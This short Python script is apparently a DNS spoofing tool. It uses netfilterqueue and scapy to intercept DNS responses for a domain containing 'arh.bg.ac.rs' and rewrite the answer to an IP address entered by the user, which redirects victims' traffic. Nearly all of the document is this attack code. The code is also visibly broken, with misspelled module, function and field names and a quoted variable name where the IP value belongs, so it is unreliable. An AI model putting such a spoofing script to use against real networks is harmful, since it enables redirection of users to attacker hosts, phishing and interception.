import netfiilterqueue

from scapy.all import *

IPaddress=input("please enter the IP address: ")
def del_fields(scapypackets):
    del scapypackets[Ip].len
    del scapypackets[Ip].chksum
    del scapypackets[Udp].len
    del scapypackets[Ip].chksm
    return scapypackets


def process_packet(packet):
    scapypackets= Ip(packet.get_payload())
    #print(scapypackets)
    if scapypackets.haslayer(DNSRR):
        qname=scapypackets[DNSQR].qname
        if "arh.bg.ac.rs" in qname:
            answer = DNSRR(rrname=qname, rdata="IPaddress")
            scapypackets[DNS].an = answer
            scapypackets[DNS].account=1

            scapypackets= del_fileds(scapypackets)
            packet.set_payload(str(scapypackets))
        packet.accept()


queue= netfiilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()